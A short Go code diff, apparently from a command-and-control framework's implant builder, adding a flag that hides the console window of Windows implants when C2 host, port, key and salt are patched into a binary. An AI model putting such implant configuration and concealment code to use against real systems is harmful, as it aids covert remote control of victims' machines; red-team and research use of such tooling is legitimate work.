@@ -19,6 +19,7 @@ const (
 	C2EmbedRelOffsetHeartbeat = c2embed.RelOffsetHeartbeat
 	C2EmbedRelOffsetWebHost   = c2embed.RelOffsetWebHost
 	C2EmbedRelOffsetWebPort   = c2embed.RelOffsetWebPort
+	C2EmbedRelOffsetFlags     = c2embed.RelOffsetFlags
 	C2EmbedRelOffsetTail      = c2embed.RelOffsetTail
 )
 
@@ -68,9 +69,14 @@ func PatchC2Embed(bin []byte, cfg *Config, host string, port int) ([]byte, error
 	tcpHostField := embedHostPortCombo(host, port, c2embed.HostLen)
 	webHostField := embedHostPortCombo(wh, wp, c2embed.WebHostLen)
 
+	var flags uint32
+	if cfg.HideConsole && cfg.OS == "windows_x64" {
+		flags |= c2embed.FlagHideConsole
+	}
+
 	out := make([]byte, len(bin))
 	copy(out, bin)
-	if err := c2embed.WriteAt(out, off, tcpHostField, port, cfg.VKey, cfg.Salt, hi, webHostField, wp); err != nil {
+	if err := c2embed.WriteAt(out, off, tcpHostField, port, cfg.VKey, cfg.Salt, hi, webHostField, wp, flags); err != nil {
 		return nil, err
 	}
 	return out, nil
